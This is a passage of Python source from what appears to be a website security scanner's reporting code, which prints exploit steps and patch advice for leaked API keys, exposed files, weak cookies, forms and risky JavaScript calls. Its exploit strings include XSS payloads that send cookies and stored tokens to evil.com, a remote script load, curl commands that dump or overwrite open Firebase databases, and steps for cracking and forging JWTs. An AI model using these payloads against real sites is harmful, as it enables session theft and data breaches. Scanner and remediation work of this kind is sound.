                    "   hashcat -m 16500 token.txt wordlist.txt\n"
                    "5. Forge admin token if you find the secret.\n"
                    "6. Access protected API endpoints with forged token."
                ),
                "Firebase API Key": (
                    "1. Find project ID from key or source code.\n"
                    "2. Test Firestore database access:\n"
                    "   curl 'https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents?key=KEY'\n"
                    "3. Test Realtime Database:\n"
                    "   curl 'https://PROJECT.firebaseio.com/.json?key=KEY'\n"
                    "4. If rules are {\\'.read\\': true}, dump ALL data.\n"
                    "5. Read/write user data, steal PII, payment info."
                ),
                "Firebase URL": (
                    "1. Test database access:\n"
                    "   curl 'https://PROJECT.firebaseio.com/.json'\n"
                    "2. If open, dump entire database:\n"
                    "   curl 'https://PROJECT.firebaseio.com/users.json'\n"
                    "3. Write malicious data:\n"
                    "   curl -X PUT 'https://PROJECT.firebaseio.com/compromised.json' -d '{\"hacked\":true}'\n"
                    "4. Common in vibe-coded apps with default permissive rules."
                ),
            }
            patch_map = {
                "AWS Access Key": "1. IMMEDIATELY rotate in AWS IAM Console → Users → Security credentials.\n2. Use AWS Secrets Manager or SSM Parameter Store.\n3. Never hardcode — use IAM roles for EC2/Lambda.\n4. Enable CloudTrail to audit what the leaked key accessed.",
                "AWS Secret Key": "Same as AWS Access Key — rotate both together in IAM Console.",
                "Google API Key": "1. Go to Google Cloud Console → APIs & Services → Credentials.\n2. Add HTTP referrer restrictions (your domain only).\n3. Add API restrictions (only enable needed APIs).\n4. For sensitive APIs (Cloud, AI), use server-side service accounts instead.\n5. Rotate the key after restricting.",
                "Stripe Secret Key": "1. IMMEDIATELY rotate in Stripe Dashboard → Developers → API Keys → Roll Key.\n2. Secret keys must NEVER be in frontend code.\n3. Use server-side API route as proxy (e.g., /api/stripe/charge).\n4. Enable Stripe webhook signatures for server verification.",
                "Stripe Publishable Key": "Publishable keys are designed for frontend, but:\n1. Ensure no secret key is also exposed.\n2. Set up domain restrictions in Stripe Dashboard.\n3. Monitor for unexpected charges.",
                "OpenAI API Key": "1. Rotate at platform.openai.com → API Keys → Create new → Delete old.\n2. Create a server-side proxy: /api/ai/chat → forwards to OpenAI.\n3. Set usage limits in OpenAI dashboard.\n4. Use per-project keys with minimal permissions.",
                "Anthropic API Key": "1. Rotate at console.anthropic.com → API Keys.\n2. Build a backend proxy endpoint.\n3. Set workspace spending limits.\n4. Never expose in client-side JavaScript bundles.",
                "OpenRouter API Key": "1. Rotate at openrouter.ai → Settings → API Keys.\n2. Create a backend proxy endpoint.\n3. Set per-model and total spending limits.\n4. Use separate keys per environment.",
                "GitHub Token": "1. Revoke at GitHub → Settings → Developer settings → Personal access tokens.\n2. Use fine-grained tokens with minimal scope and expiry.\n3. For CI/CD, use GITHUB_TOKEN (automatic, scoped to repo).\n4. Store in GitHub Actions secrets, not code.",
                "Slack Token": "1. Revoke at api.slack.com → Your Apps → OAuth & Permissions.\n2. Use proper OAuth 2.0 flow instead of hardcoded tokens.\n3. Request minimum scopes needed.\n4. Rotate regularly.",
                "Discord Webhook": "1. Delete webhook in Discord Server Settings → Integrations.\n2. Create a new webhook URL.\n3. Never expose webhook URLs in client-side code.\n4. Use server-side proxy to post messages.",
                "Discord Bot Token": "1. Regenerate at discord.com/developers → Bot → Reset Token.\n2. Store in environment variables only.\n3. Grant minimum permissions (principle of least privilege).",
                "Database URL": "1. IMMEDIATELY change database password.\n2. Move connection string to server-side environment variables.\n3. Use connection pooling (PgBouncer, etc.) with restricted user.\n4. Enable SSL for database connections.\n5. Restrict DB access to application server IPs only.",
                "JWT Token": "1. Invalidate the token (add to blocklist or change signing secret).\n2. Implement proper token rotation with short expiry (15-30 min).\n3. Store in HttpOnly, Secure, SameSite cookies — never localStorage.\n4. Use strong signing secrets (256+ bits).",
                "Firebase API Key": "1. Set proper Firestore Security Rules (deny by default).\n2. Set proper Realtime Database rules.\n3. Restrict API key in Google Cloud Console.\n4. API key alone shouldn't grant access if rules are correct — but verify rules!",
                "Firebase URL": "1. Set security rules: { \".read\": \"auth != null\", \".write\": \"auth != null\" }\n2. Never use { \".read\": true } in production.\n3. Validate all data writes with rules.\n4. Use Firebase App Check for additional protection.",
                "SendGrid API Key": "1. Revoke in SendGrid → Settings → API Keys.\n2. Create new key with minimum permissions (Mail Send only).\n3. Use server-side only — never expose in frontend.",
                "Twilio API Key": "1. Revoke at twilio.com → Console → API Keys.\n2. Create new key with minimum permissions.\n3. Enable geographic permissions to prevent premium SMS abuse.",
                "Supabase Key": "1. Enable Row Level Security (RLS) on ALL tables.\n2. Write proper RLS policies for each table.\n3. The anon key is public by design, but RLS must protect data.\n4. Use service_role key only server-side.\n5. Test: can an anonymous user read/write data they shouldn't?",
                "Heroku API Key": "1. Rotate at Heroku Dashboard → Account Settings → API Key → Regenerate.\n2. Use Heroku CLI auth (heroku login) instead of hardcoded keys.\n3. Store in environment variables (heroku config:set).",
                "Mapbox Token": "1. Rotate at mapbox.com → Account → Access tokens.\n2. Set URL restrictions on the token.\n3. Use separate tokens for dev/prod.",
            }
            default_exploit = (
                "1. Extract the secret from the page source or JS bundle.\n"
                "2. Use it to authenticate against the associated API.\n"
                "3. Depending on the service: access data, make charges, send messages, or modify resources.\n"
                "4. Automate abuse with scripts to maximize impact before detection."
            )
            default_patch = "1. Remove from source code IMMEDIATELY.\n2. Store in environment variables (.env) loaded server-side only.\n3. Create a backend API proxy so the key never reaches the browser.\n4. Rotate the compromised credential at the provider's dashboard.\n5. Audit logs for unauthorized usage during exposure period."
            typ = s["type"]
            self.console.print(Panel(
                f"[bold]Type:[/bold] {typ}\n"
                f"[bold]Value:[/bold] [red]{s['value_masked']}[/red]\n"
                f"[bold]Location:[/bold] {s['location']}\n"
                f"[bold]Context:[/bold] [dim]{s['context']}[/dim]\n\n"
                f"[bold red]━━━ EXPLOIT ━━━[/bold red]\n{exploit_map.get(typ, default_exploit)}\n\n"
                f"[bold green]━━━ PATCH ━━━[/bold green]\n{patch_map.get(typ, default_patch)}",
                title=f"{self._sev(sev)} Secret Exposed: {typ}", border_style="red"))

    def _report_sensitive_paths(self, paths):
        self._section("SENSITIVE FILE EXPOSURE", "📂")
        if not paths:
            self.console.print("[bold green]  ✓ No sensitive files exposed.[/bold green]")
            return
        for p in paths:
            sev = p.get("severity", "HIGH")
            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
            path_exploits = {
                "/.env": ("Read environment variables containing secrets, DB creds, API keys.", "Block access via web server config. Add .env to .gitignore."),
                "/.git/config": ("Clone entire source code: git-dumper to reconstruct repo history.", "Block /.git/ path in web server. Remove .git from deployment."),
                "/package.json": ("Enumerate dependencies, find vulnerable versions.", "Remove from public access or restrict path."),
                "/robots.txt": ("Discover hidden paths the site doesn't want indexed.", "Review entries — don't list truly sensitive paths here."),
            }
            default_exp = ("Access sensitive configuration or data files.", "Block public access via web server configuration (nginx/apache).")
            exp, patch = path_exploits.get(p["path"], default_exp)
            self.console.print(Panel(
                f"[bold]Path:[/bold] {p['path']}\n"
                f"[bold]Status:[/bold] {p['status']} | [bold]Size:[/bold] {p['size']:,} bytes\n"
                f"[bold]Preview:[/bold] [dim]{p['snippet'][:100]}[/dim]\n\n"
                f"[bold red]Exploit:[/bold red] {exp}\n"
                f"[bold green]Patch:[/bold green] {patch}",
                title=f"{self._sev(sev)} Exposed: {p['path']}", border_style="yellow"))

    def _report_cookies(self, cookies):
        if not cookies:
            return
        self._section("COOKIE SECURITY", "🍪")
        has_issues = any(c.get("issues") for c in cookies)
        t = Table(box=box.ROUNDED, padding=(0, 1))
        t.add_column("Name", style="bold white")
        t.add_column("Secure", width=8)
        t.add_column("HttpOnly", width=10)
        t.add_column("SameSite", width=10)
        t.add_column("Issues", style="yellow")
        for c in cookies:
            sec = "[green]✓[/green]" if c["secure"] else "[red]✗[/red]"
            http = "[green]✓[/green]" if c["httponly"] else "[red]✗[/red]"
            ss = c["samesite"]
            issues = "; ".join(c.get("issues", []))[:60]
            t.add_row(c["name"], sec, http, str(ss), issues)
            if c.get("issues"):
                self.vuln_count["MEDIUM"] += len(c["issues"])
        self.console.print(t)
        if has_issues:
            self.console.print(Panel(
                "[bold red]Exploit:[/bold red] Insecure cookies can be stolen via XSS (no HttpOnly), sent over HTTP (no Secure), or used in CSRF attacks (no SameSite).\n\n"
                "[bold green]Patch:[/bold green] Set all cookies with: Secure; HttpOnly; SameSite=Strict (or Lax for auth cookies).",
                title="⚠ Cookie Security Issues", border_style="yellow"))

    def _report_forms(self, forms):
        if not forms:
            return
        self._section("FORM SECURITY ANALYSIS", "📝")
        for i, f in enumerate(forms):
            issues = f.get("issues", [])
            color = "red" if issues else "green"
            inputs_str = ", ".join(f"{inp['type']}({inp['name']})" for inp in f.get("inputs", [])[:8])
            self.console.print(Panel(
                f"[bold]Action:[/bold] {f['action']}\n"
                f"[bold]Method:[/bold] {f['method']}\n"
                f"[bold]CSRF Token:[/bold] {'[green]✓ Yes[/green]' if f['has_csrf'] else '[red]✗ No[/red]'}\n"
                f"[bold]Inputs:[/bold] {inputs_str}" +
                (f"\n\n[bold red]Issues:[/bold red]\n" + "\n".join(f"  • {iss}" for iss in issues) if issues else ""),
                title=f"Form #{i+1}", border_style=color))
            if issues:
                self.vuln_count["MEDIUM"] += len(issues)

    def _report_info_leaks(self, leaks):
        if not leaks:
            return
        self._section("INFORMATION LEAKS", "💧")
        for l in leaks:
            sev = l.get("severity", "MEDIUM")
            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
            self.console.print(Panel(
                f"[bold]{l['type']}[/bold]\n[dim]{l['content'][:150]}[/dim]\n\n"
                f"[bold red]Exploit:[/bold red] Exposed debug info or source maps let attackers understand app internals and find vulnerabilities.\n"
                f"[bold green]Patch:[/bold green] Remove debug info and source maps from production builds.",
                title=self._sev(sev), border_style="yellow"))

    def _report_js(self, findings):
        if not findings:
            return
        self._section("JAVASCRIPT SECURITY ANALYSIS", "⚡")

        # Group findings by pattern type
        by_pattern = {}
        for f in findings:
            p = f["pattern"]
            if p not in by_pattern:
                by_pattern[p] = []
            by_pattern[p].append(f)

        # Show table
        t = Table(box=box.ROUNDED, padding=(0, 1))
        t.add_column("Pattern", style="bold white", width=18)
        t.add_column("Risk", style="yellow", width=35)
        t.add_column("Source", style="dim", width=35)
        for f in findings[:20]:
            t.add_row(f["pattern"], f["description"][:35], f["source"][-35:])
        self.console.print(t)

        # Concrete exploits for each pattern
        exploit_map = {
            "eval(": {
                "exploit": """eval() executes strings as code - any user input reaching eval() = RCE:
1. Search param reflected: ?q=eval(atob('YWxlcnQoMSk=')) // decodes to alert(1)
2. DOMPurify bypass: <img src=x onerror="eval('al'+'ert(1)')">
3. Prototype pollution: ?__proto__[x]=eval&constructor[x]=alert
4. Real payload: eval(userInput) where userInput='require("child_process").exec("id")'""",
                "patch": "Replace eval() with JSON.parse() for JSON, or use Function() with strict input validation. Never pass user input to eval()."
            },
            "innerHTML": {
                "exploit": """innerHTML parses HTML - XSS if user input is inserted without sanitization:
1. <div id="x"></div><script>document.getElementById('x').innerHTML='<img onerror=alert(1) src=x>'</script>
2. Stored XSS: User comment containing <svg onload=fetch('http://evil.com/?c='+document.cookie)>
3. DOM Clobbering: <form id="x"><input id="y" name="innerHTML"> → document.getElementById('x').innerHTML overwrites DOM
4. Bypass filters: <img src=x onerror=eval('al'+'ert(1)')>""",
                "patch": "Use textContent instead of innerHTML for plain text. If HTML needed, sanitize with DOMPurify.before(message) before innerHTML assignment."
            },
            "document.write(": {
                "exploit": """document.write() writes HTML directly - classic XSS vector:
1. <script>document.write('<img src=x onerror=alert(document.cookie)>')</script>
2. script injection: ?x=<script>fetch('http://evil.com/?c='+document.cookie)</script>
3. Older technique: document.write('<script src=//evil.com/payload.js></script>')""",
                "patch": "Replace with document.createElement() + appendChild(), or innerHTML with prior sanitization. Modern code should never use document.write()."
            },
            "location.href=": {
                "exploit": """Unvalidated redirect if URL parameter controls location.href:
1. ?redirect=https://evil.com (phishing landing page looks legitimate)
2. ?next=/admin/delete?id=5 (forced navigation to destructive action)
3. ?url=javascript:alert(1) (in older browsers)
4. Real attack: Create phishing page identical to target, redirect to it.""",
                "patch": "Validate URLs against an allowlist. Use URL.parse() to check hostname before assignment to location.href."
            },
            "document.cookie": {
                "exploit": """Reading document.cookie without HttpOnly exposes session tokens:
1. <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
2. Exploit: If session cookie lacks HttpOnly, steal it for session hijacking
3. Chain with XSS: Inject script that reads cookie and sends to attacker
4. Check cookies: document.cookie.split(';').forEach(c=>fetch('log/'+c))""",
                "patch": "Ensure all session cookies have HttpOnly and Secure flags. Audit what data is stored in cookies vs localStorage."
            },
            "localStorage.": {
                "exploit": """localStorage persists across sessions - sensitive data here is accessible to XSS:
1. <script>fetch('http://evil.com/?d='+localStorage.getItem('token'))</script>
2. localStorage.setItem('malicious','<img src=x onerror=...>') - stored XSS
3. Auth tokens, API keys, or PII stored in localStorage can be stolen
4. Browser extension XSS: malicious extension reads localStorage""",
                "patch": "Don't store sensitive data in localStorage. Use sessionStorage for temporary data, or encrypt sensitive data before storage."
            },
            "sessionStorage.": {
                "exploit": """sessionStorage is less persistent but still vulnerable to XSS:
1. Same XSS steal technique as localStorage
2. Data persists until tab close (vs localStorage which persists)
3. Still exploitable if page has XSS: fetch('http://evil.com/?s='+sessionStorage.getItem('data'))""",
                "patch": "Same as localStorage - don't store sensitive data without encryption. Clear sessionStorage on logout."
            },
            "postMessage(": {
                "exploit": """postMessage can leak data if origin is not validated:
1. Attacker page: <iframe src="https://target.com"><script>frames[0].postMessage('secret','*')</script>
2. If target listens without checking origin, attacker reads sensitive data
3. Fake parent: malicious page sends postMessage pretending to be legitimate parent
4. Check: window.addEventListener('message', e => { if (e.origin !== 'https://trusted.com') return; ... })""",
                "patch": "Always validate event.origin in message listener: if (e.origin !== 'https://trusted.com') return;. Don't use '*' as targetOrigin."
            },
        }

        for pattern, data in by_pattern.items():
            if pattern in exploit_map:
                self.console.print(Panel(
                    f"[bold red]Exploit:[/bold red]\n{exploit_map[pattern]['exploit']}\n\n"
                    f"[bold green]Patch:[/bold green] {exploit_map[pattern]['patch']}",
                    title=f"⚠ {pattern} - {len(data)} occurrence(s)", border_style="yellow"))

    def _report_api_discovery(self, findings):
        if not findings:
            return
        self._section("API & GRAPHQL DISCOVERY", "🔌")
        for f in findings:
            sev = f["severity"]
            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
            self.console.print(Panel(
                f"[bold]URL:[/bold] {f['url']}\n\n"
                f"[bold red]Description / Exploit:[/bold red]\n{f['description']}",
                title=f"{self._sev(sev)} {f['type']}", border_style="yellow"))

    def _report_wpscan(self, findings):
        if not findings:
            return
        self._section("WPSCAN - WORDPRESS SECURITY", "📛")
        for f in findings:
            sev = f["severity"]
            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
            self.console.print(Panel(
                f"[bold]Description:[/bold] {f['description']}",
                title=f"{self._sev(sev)} {f['name']}", border_style="yellow"))

    def _report_gitleaks(self, findings):
        if not findings:
            return
        self._section("GITLEAKS - GIT REPOSITORY SECRETS", "🔑")
        for f in findings:
            sev = f["severity"]
            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
            self.console.print(Panel(
                f"[bold]File/Line:[/bold] {f['description']}\n"
                f"[bold]Repository:[/bold] {f['url']}",
                title=f"{self._sev(sev)} {f['name']}", border_style="red"))

    def _report_summary(self):
        self.console.print()
        total = sum(self.vuln_count.values())
        t = Table(box=box.HEAVY, title="[bold white]VULNERABILITY SUMMARY[/bold white]", padding=(0, 3))
        t.add_column("Severity", style="bold white", width=15)
        t.add_column("Count", justify="center", width=10)
        t.add_column("Bar", width=30)
        max_v = max(self.vuln_count.values()) if self.vuln_count.values() else 1
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = self.vuln_count.get(sev, 0)
            bar_len = int((count / max(max_v, 1)) * 25) if count else 0
            bar = "█" * bar_len
            color = SEV_COLORS.get(sev, "white")
            t.add_row(self._sev(sev), str(count), f"[{color}]{bar}[/{color}]")
        self.console.print(t)
        if total == 0:
            grade, gcolor = "A+", "bold green"
        elif self.vuln_count.get("CRITICAL", 0) > 0:
            grade, gcolor = "F", "bold white on red"
        elif self.vuln_count.get("HIGH", 0) > 2:
            grade, gcolor = "D", "bold red"
        elif self.vuln_count.get("HIGH", 0) > 0:
            grade, gcolor = "C", "bold yellow"
        elif self.vuln_count.get("MEDIUM", 0) > 3:
            grade, gcolor = "B-", "bold yellow"
        else:
            grade, gcolor = "B+", "bold green"
        self.console.print()
        self.console.print(Panel(
            f"[{gcolor}]  SECURITY GRADE: {grade}  [/{gcolor}]\n\n"
            f"[white]Total findings: {total}[/white]",
            title="[bold]FINAL SCORE[/bold]", border_style="bright_red", padding=(1, 6)))

    def _report_ai_analysis(self, analysis):
        if not analysis:
            return
        self.console.print()
        self._section("AI POWERED EXPLOITATION ANALYSIS", "🤖")
        self.console.print(Panel(
            f"[white]{analysis}[/white]",
            title="[bold red]🔴 EXPERT PENETRATION TESTER ANALYSIS[/bold red]",
            border_style="red",
            padding=(1, 2)
        ))
